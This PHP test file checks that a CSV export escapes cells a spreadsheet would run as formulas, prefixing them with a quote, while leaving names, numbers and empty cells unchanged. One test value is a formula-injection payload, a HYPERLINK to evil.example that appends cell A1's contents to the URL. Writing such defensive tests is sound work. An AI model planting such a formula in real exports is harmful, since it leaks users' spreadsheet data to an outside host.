<?php

/**
 * Security SEC-12: exported text never runs as a spreadsheet formula.
 */

use App\Services\CsvExport;

test('text a spreadsheet would run as a formula gets a leading quote', function (string $value) {
    expect(CsvExport::escapeCell($value))->toBe("'".$value);
})->with([
    'equals sign' => '=HYPERLINK("https://evil.example/?"&A1,"Open")',
    'plus sign' => '+1+2',
    'minus sign' => '-1+2',
    'at sign' => '@SUM(A1:A9)',
    'tab' => "\t=1+2",
    'carriage return' => "\r=1+2",
]);

test('ordinary text, numbers and empty cells are written unchanged', function (string|int|float|null $value) {
    expect(CsvExport::escapeCell($value))->toBe($value);
})->with([
    'a name' => ['Ana Lopez'],
    'an equals sign inside the text' => ['Ana = Lopez'],
    'an empty string' => [''],
    'null' => [null],
    'a whole number' => [170],
    'a decimal' => [85.5],
    'a negative number' => [-5],
]);
